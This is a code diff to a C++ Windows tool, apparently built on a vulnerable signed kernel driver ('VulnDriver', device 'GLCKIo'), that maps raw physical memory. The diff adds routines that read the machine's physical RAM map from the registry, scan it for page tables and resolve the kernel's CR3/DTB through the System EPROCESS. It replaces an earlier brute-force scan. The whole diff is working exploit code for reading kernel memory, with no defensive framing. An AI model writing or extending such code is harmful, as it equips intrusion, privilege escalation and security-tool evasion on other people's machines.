@@ -10,6 +10,8 @@
 #include <mscat.h>
 #include <string>
 #include <cstdarg>
+#include <algorithm>
+#include <vector>
 
 #pragma comment(lib, "setupapi.lib")
 #pragma comment(lib, "wintrust.lib")
@@ -52,6 +54,61 @@ DEFINE_GUID(GUID_DEVINTERFACE_GIO_ALT,
 namespace VulnDriver {
 
     static ULONGLONG g_MaxPhysAddr = 0;
+    struct PhysicalRange {
+        ULONGLONG base;
+        ULONGLONG size;
+    };
+
+#pragma pack(push, 4)
+    struct RegistryPartialResourceDescriptor {
+        UCHAR type;
+        UCHAR shareDisposition;
+        USHORT flags;
+        union {
+            struct {
+                LARGE_INTEGER start;
+                ULONG length;
+            } memory;
+            struct {
+                LARGE_INTEGER start;
+                ULONG length40;
+            } memory40;
+            struct {
+                LARGE_INTEGER start;
+                ULONG length48;
+            } memory48;
+            struct {
+                LARGE_INTEGER start;
+                ULONG length64;
+            } memory64;
+            BYTE raw[16];
+        } u;
+    };
+
+    struct RegistryPartialResourceList {
+        USHORT version;
+        USHORT revision;
+        ULONG count;
+        RegistryPartialResourceDescriptor descriptors[1];
+    };
+
+    struct RegistryFullResourceDescriptor {
+        ULONG interfaceType;
+        ULONG busNumber;
+        RegistryPartialResourceList partialResourceList;
+    };
+
+    struct RegistryResourceList {
+        ULONG count;
+        RegistryFullResourceDescriptor list[1];
+    };
+#pragma pack(pop)
+
+    static constexpr UCHAR kRegistryResourceTypeMemory = 3;
+    static constexpr UCHAR kRegistryResourceTypeMemoryLarge = 7;
+    static constexpr USHORT kRegistryMemoryLarge40 = 0x0200;
+    static constexpr USHORT kRegistryMemoryLarge48 = 0x0400;
+    static constexpr USHORT kRegistryMemoryLarge64 = 0x0800;
 
     static const wchar_t* DeviceNames[] = {
         L"\\??\\GLCKIo",
@@ -647,6 +704,20 @@ namespace VulnDriver {
         return TRUE;
     }
 
+    static BOOL ReadMappedU64(const BYTE* address, ULONGLONG* value) {
+        if (!address || !value) {
+            return FALSE;
+        }
+
+        __try {
+            *value = *reinterpret_cast<const ULONGLONG*>(address);
+            return TRUE;
+        } __except (EXCEPTION_EXECUTE_HANDLER) {
+            *value = 0;
+            return FALSE;
+        }
+    }
+
     static ULONGLONG VirtualToPhysicalWithCR3(HANDLE device, ULONGLONG cr3, ULONGLONG va) {
         ULONGLONG pml4Index = (va >> 39) & 0x1FF;
         ULONGLONG pdptIndex = (va >> 30) & 0x1FF;
@@ -707,6 +778,115 @@ namespace VulnDriver {
         return IsPhysAddrSafe(result) ? result : 0;
     }
 
+    static ULONGLONG ResourceMemoryLength(const RegistryPartialResourceDescriptor& desc) {
+        if (desc.type == kRegistryResourceTypeMemory) {
+            return desc.u.memory.length;
+        }
+
+        if (desc.type != kRegistryResourceTypeMemoryLarge) {
+            return 0;
+        }
+
+        if ((desc.flags & kRegistryMemoryLarge40) == kRegistryMemoryLarge40) {
+            return static_cast<ULONGLONG>(desc.u.memory40.length40) << 8;
+        }
+
+        if ((desc.flags & kRegistryMemoryLarge48) == kRegistryMemoryLarge48) {
+            return static_cast<ULONGLONG>(desc.u.memory48.length48) << 16;
+        }
+
+        if ((desc.flags & kRegistryMemoryLarge64) == kRegistryMemoryLarge64) {
+            return static_cast<ULONGLONG>(desc.u.memory64.length64) << 32;
+        }
+
+        return 0;
+    }
+
+    static BOOL QueryPhysicalMemoryRanges(std::vector<PhysicalRange>& ranges) {
+        ranges.clear();
+
+        HKEY key = nullptr;
+        LSTATUS status = RegOpenKeyExW(
+            HKEY_LOCAL_MACHINE,
+            L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
+            0,
+            KEY_QUERY_VALUE,
+            &key);
+        if (status != ERROR_SUCCESS) {
+            VLOG("physical_range_query open_failed gle=%lu", static_cast<unsigned long>(status));
+            return FALSE;
+        }
+
+        DWORD valueType = 0;
+        DWORD valueSize = 0;
+        status = RegQueryValueExW(key, L".Translated", nullptr, &valueType, nullptr, &valueSize);
+        if (status != ERROR_SUCCESS || valueType != REG_RESOURCE_LIST || valueSize < sizeof(RegistryResourceList)) {
+            VLOG("physical_range_query size_failed status=%lu type=%lu size=%lu", static_cast<unsigned long>(status), static_cast<unsigned long>(valueType), static_cast<unsigned long>(valueSize));
+            RegCloseKey(key);
+            return FALSE;
+        }
+
+        std::vector<BYTE> buffer(valueSize);
+        status = RegQueryValueExW(key, L".Translated", nullptr, &valueType, buffer.data(), &valueSize);
+        RegCloseKey(key);
+        if (status != ERROR_SUCCESS || valueType != REG_RESOURCE_LIST || valueSize < sizeof(RegistryResourceList)) {
+            VLOG("physical_range_query read_failed status=%lu type=%lu size=%lu", static_cast<unsigned long>(status), static_cast<unsigned long>(valueType), static_cast<unsigned long>(valueSize));
+            return FALSE;
+        }
+
+        const auto* list = reinterpret_cast<const RegistryResourceList*>(buffer.data());
+        const BYTE* cursor = reinterpret_cast<const BYTE*>(&list->list[0]);
+        const BYTE* end = buffer.data() + valueSize;
+
+        for (ULONG fullIndex = 0; fullIndex < list->count; ++fullIndex) {
+            if (cursor + sizeof(RegistryFullResourceDescriptor) > end) {
+                break;
+            }
+
+            const auto* full = reinterpret_cast<const RegistryFullResourceDescriptor*>(cursor);
+            const ULONG partialCount = full->partialResourceList.count;
+            const BYTE* partialCursor = reinterpret_cast<const BYTE*>(&full->partialResourceList.descriptors[0]);
+            const BYTE* nextFull = partialCursor + static_cast<SIZE_T>(partialCount) * sizeof(RegistryPartialResourceDescriptor);
+            if (nextFull > end) {
+                break;
+            }
+
+            for (ULONG partialIndex = 0; partialIndex < partialCount; ++partialIndex) {
+                const auto& desc = full->partialResourceList.descriptors[partialIndex];
+                const ULONGLONG length = ResourceMemoryLength(desc);
+                const ULONGLONG start = desc.u.memory.start.QuadPart;
+                if (length == 0 || start < 0x1000) {
+                    continue;
+                }
+
+                ULONGLONG alignedStart = (start + 0xFFFULL) & ~0xFFFULL;
+                ULONGLONG endAddress = start + length;
+                if (endAddress <= alignedStart) {
+                    continue;
+                }
+                endAddress &= ~0xFFFULL;
+                if (endAddress <= alignedStart) {
+                    continue;
+                }
+
+                ranges.push_back({ alignedStart, endAddress - alignedStart });
+            }
+
+            cursor = nextFull;
+        }
+
+        std::sort(ranges.begin(), ranges.end(), [](const PhysicalRange& a, const PhysicalRange& b) {
+            return a.base < b.base;
+        });
+
+        VLOG("physical_range_query result count=%zu", ranges.size());
+        for (size_t i = 0; i < ranges.size(); ++i) {
+            VLOG("physical_range[%zu] base=0x%llX size=0x%llX end=0x%llX", i, ranges[i].base, ranges[i].size, ranges[i].base + ranges[i].size);
+        }
+
+        return !ranges.empty();
+    }
+
     static BOOL VerifyCR3Candidate(HANDLE device, ULONGLONG cr3Candidate, ULONGLONG ntoskrnlVA) {
         if (ntoskrnlVA == 0) {
             return FALSE;
@@ -727,6 +907,124 @@ namespace VulnDriver {
         }
 
         return FALSE;
+    }
+
+    static ULONGLONG TryResolveSystemDtbFromCandidate(HANDLE device, ULONGLONG testCR3, ULONGLONG psInitialSystemProcess, ULONGLONG ntoskrnlBase) {
+        if ((testCR3 & 0xFFFULL) != 0 || !IsPhysAddrSafe(testCR3)) {
+            return 0;
+        }
+
+        ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, psInitialSystemProcess);
+        if (physPsInit == 0) {
+            return 0;
+        }
+
+        ULONGLONG systemEprocess = 0;
+        if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
+            return 0;
+        }
+
+        if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
+            return 0;
+        }
+
+        ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
+        if (physEprocess == 0) {
+            return 0;
+        }
+
+        ULONGLONG dtb = 0;
+        if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
+            return 0;
+        }
+
+        dtb &= ~0xFFFULL;
+        if (dtb == 0 || !IsPhysAddrSafe(dtb)) {
+            return 0;
+        }
+
+        if (!VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
+            return 0;
+        }
+
+        return dtb;
+    }
+
+    static ULONGLONG FindKernelCR3FromRamMap(HANDLE device, ULONGLONG psInitialSystemProcess, ULONGLONG ntoskrnlBase) {
+        std::vector<PhysicalRange> ranges;
+        if (!QueryPhysicalMemoryRanges(ranges)) {
+            VLOG("ram_map_cr3_resolve skipped reason=physical_ranges_unavailable");
+            return 0;
+        }
+
+        const ULONGLONG pml4Index = (ntoskrnlBase >> 39) & 0x1FF;
+        const ULONGLONG pml4Offset = pml4Index * 8;
+        const ULONGLONG chunkSize = 0x1000000ULL;
+        ULONGLONG pagesChecked = 0;
+        ULONGLONG presentKernelEntries = 0;
+        ULONGLONG exactCandidates = 0;
+        const ULONGLONG startTick = GetTickCount64();
+
+        for (const auto& range : ranges) {
+            ULONGLONG cursor = range.base;
+            ULONGLONG rangeEnd = range.base + range.size;
+            while (cursor < rangeEnd) {
+                ULONGLONG remaining = rangeEnd - cursor;
+                ULONG mapSize = static_cast<ULONG>(remaining > chunkSize ? chunkSize : remaining);
+                mapSize &= ~0xFFFUL;
+                if (mapSize == 0) {
+                    break;
+                }
+
+                PVOID mapped = nullptr;
+                NTSTATUS mapStatus = MapPhysicalMemory(device, cursor, mapSize, &mapped);
+                if (!NT_SUCCESS(mapStatus) || mapped == nullptr) {
+                    if (mapSize > 0x1000) {
+                        mapSize = 0x1000;
+                        mapStatus = MapPhysicalMemory(device, cursor, mapSize, &mapped);
+                    }
+                }
+
+                if (NT_SUCCESS(mapStatus) && mapped != nullptr) {
+                    const BYTE* bytes = static_cast<const BYTE*>(mapped);
+                    for (ULONG offset = 0; offset + 0x1000 <= mapSize; offset += 0x1000) {
+                        ++pagesChecked;
+                        ULONGLONG pml4e = 0;
+                        if (!ReadMappedU64(bytes + offset + pml4Offset, &pml4e)) {
+                            continue;
+                        }
+
+                        if ((pml4e & 1) == 0 || (pml4e & 0x80) != 0) {
+                            continue;
+                        }
+
+                        const ULONGLONG pdptPhys = pml4e & 0xFFFFFFFFF000ULL;
+                        if (!IsPhysAddrSafe(pdptPhys)) {
+                            continue;
+                        }
+
+                        ++presentKernelEntries;
+                        const ULONGLONG candidate = cursor + offset;
+                        const ULONGLONG dtb = TryResolveSystemDtbFromCandidate(device, candidate, psInitialSystemProcess, ntoskrnlBase);
+                        if (dtb != 0) {
+                            ++exactCandidates;
+                            UnmapPhysicalMemory(device, mapped);
+                            VLOG("ram_map_cr3_resolve success dtb=0x%llX source_candidate=0x%llX pages_checked=%llu present_kernel_entries=%llu exact_candidates=%llu elapsed_ms=%llu",
+                                 dtb, candidate, pagesChecked, presentKernelEntries, exactCandidates, VElapsedMs(startTick));
+                            return dtb;
+                        }
+                    }
+
+                    UnmapPhysicalMemory(device, mapped);
+                }
+
+                cursor += mapSize;
+            }
+        }
+
+        VLOG("ram_map_cr3_resolve exhausted pages_checked=%llu present_kernel_entries=%llu exact_candidates=%llu elapsed_ms=%llu",
+             pagesChecked, presentKernelEntries, exactCandidates, VElapsedMs(startTick));
+        return 0;
     }
 
     static ULONGLONG GetKernelCR3FromEPROCESS(HANDLE device, ULONGLONG ntoskrnlBase) {
@@ -767,96 +1065,20 @@ namespace VulnDriver {
         for (int i = 0; i < sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]); i++) {
             ULONGLONG testCR3 = lowCR3Candidates[i];
 
-            ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
-            if (physPsInit == 0) {
-                continue;
-            }
-
-            ULONGLONG systemEprocess = 0;
-            if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
-                continue;
-            }
-
-            if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
-                continue;
-            }
-
-            ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
-            if (physEprocess == 0) {
-                continue;
-            }
-
-            ULONGLONG dtb = 0;
-            if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
-                continue;
-            }
-
-            dtb &= ~0xFFFULL;
-
-            if (dtb == 0 || dtb > 0x800000000ULL) {
-                continue;
-            }
-
-            if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
+            ULONGLONG dtb = TryResolveSystemDtbFromCandidate(device, testCR3, (ULONGLONG)pPsInitialSystemProcess, ntoskrnlBase);
+            if (dtb != 0) {
                 VLOG("Found kernel CR3 via EPROCESS: 0x%llX (from candidate 0x%llX)",
                      dtb, lowCR3Candidates[i]);
                 return dtb;
             }
         }
 
-        VLOG("Fast CR3 candidates exhausted, scanning 0x100000-0x20000000...");
-        int consecutiveFailures = 0;
-        const int MAX_CONSECUTIVE_FAILURES = 256; // abort if too many consecutive map failures
+        VLOG("Fast CR3 candidates exhausted; resolving through verified physical RAM ranges");
 
-        for (ULONGLONG testCR3 = 0x100000; testCR3 < 0x20000000; testCR3 += 0x1000) {
-            // Safety: skip the first read itself to check if this physical page is mappable
-            if (!IsPhysAddrSafe(testCR3)) {
-                continue;
-            }
-
-            ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
-            if (physPsInit == 0) {
-                consecutiveFailures++;
-                if (consecutiveFailures > MAX_CONSECUTIVE_FAILURES) {
-                    VLOG("WARNING: %d consecutive failures at testCR3=0x%llX, skipping ahead...",
-                         consecutiveFailures, testCR3);
-                    testCR3 += 0x100000 - 0x1000; // skip 1MB ahead
-                    consecutiveFailures = 0;
-                }
-                continue;
-            }
-            consecutiveFailures = 0;
-
-            ULONGLONG systemEprocess = 0;
-            if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
-                continue;
-            }
-
-            if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
-                continue;
-            }
-
-            ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
-            if (physEprocess == 0) {
-                continue;
-            }
-
-            ULONGLONG dtb = 0;
-            if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
-                continue;
-            }
-
-            dtb &= ~0xFFFULL;
-
-            if (dtb == 0 || dtb > 0x800000000ULL) {
-                continue;
-            }
-
-            if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
-                VLOG("Found kernel CR3 via brute-force: 0x%llX (from scan testCR3=0x%llX)",
-                     dtb, testCR3);
-                return dtb;
-            }
+        ULONGLONG ramMapDtb = FindKernelCR3FromRamMap(device, (ULONGLONG)pPsInitialSystemProcess, ntoskrnlBase);
+        if (ramMapDtb != 0) {
+            VLOG("Found kernel CR3 via physical RAM map: 0x%llX", ramMapDtb);
+            return ramMapDtb;
         }
 
         VLOG("FATAL: Could not find kernel CR3!");
